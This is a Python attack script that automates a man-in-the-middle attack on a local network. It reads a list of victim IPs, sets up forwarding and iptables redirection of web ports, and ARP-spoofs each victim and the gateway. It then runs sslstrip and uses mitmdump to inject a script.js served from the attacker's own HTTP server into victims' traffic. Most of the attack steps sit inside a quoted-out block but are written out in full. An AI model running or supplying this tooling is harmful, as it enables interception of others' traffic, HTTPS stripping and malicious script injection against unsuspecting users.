import os
import sys
import subprocess
import socket
import fcntl
import struct


#get gateway_ip (router)
gateway = sys.argv[1]
print("gateway: " + gateway)
#get interface (attacker)
interface = sys.argv[2]
print("interface: " + interface)
#get IP (attacker)
attacker_ip = sys.argv[3]
print("attacker_ip: " + attacker_ip)
# get victims_ip
victims = [line.rstrip('\n') for line in open("victims.txt")]
print("victims:")
print(victims)


#cmd = subprocess.Popen('ifconfig ' + interface, shell=True, stdout=subprocess.PIPE)
#for line in cmd.stdout:

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15]))
    )[20:24])

print(get_ip_address(interface))

'''

# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o " + interface + " -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")


# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("arpspoof -i " + interface + " -t " + victim + " " + gateway + " &")
    os.system("arpspoof -i " + interface + " -t " + gateway + " " + victim + " &")

# start the http server for serving the script.js, in a new console
os.system("python3 httpServer.py &")

# run sslstrip
os.system("sslstrip -l 8080 &")

# start the mitmproxy
os.system("mitmdump -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")

'''



